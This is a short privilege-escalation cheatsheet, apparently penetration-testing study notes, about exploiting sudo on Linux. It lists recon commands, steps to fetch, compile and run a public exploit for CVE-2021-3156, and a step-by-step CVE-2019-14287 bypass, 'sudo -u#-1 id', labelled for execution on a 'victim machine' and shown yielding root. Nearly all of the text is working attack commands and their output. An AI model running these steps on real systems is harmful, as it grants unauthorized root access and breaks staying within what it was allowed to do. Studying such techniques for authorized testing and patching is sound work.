# Cheatsheet

|Command|Use|
|---|---|
|`sudo -l`|List allowed sudo commands|
|`sudo -V \| head -n1`|Check sudo version|
|`cat /etc/lsb-release`|Identify OS version|
|`git clone https://github.com/blasty/CVE-2021-3156.git`|Download CVE-2021-3156 exploit|
|`make`|Compile exploit|
|`./sudo-hax-me-a-sandwich`|List exploit targets|

# CVE-2019-14287 (Sudo Policy Bypass)

## Requirement

User must have sudo permission for at least one command.

Example:

```bash
sudo -l
```

Output:

```text
ALL=(ALL) /usr/bin/id
```

---

## Step 1 — Check User UID

### Execute on Victim Machine

```bash
cat /etc/passwd | grep cry0l1t3
```

## Example Output

```text
cry0l1t3:x:1005:1005
```

---

## Step 2 — Exploit Negative UID

### Execute on Victim Machine

```bash
sudo -u#-1 id
```

---

## Result

```text
uid=0(root)
```

---

# Key Point

```text
sudo interprets UID -1 as UID 0 (root)
```
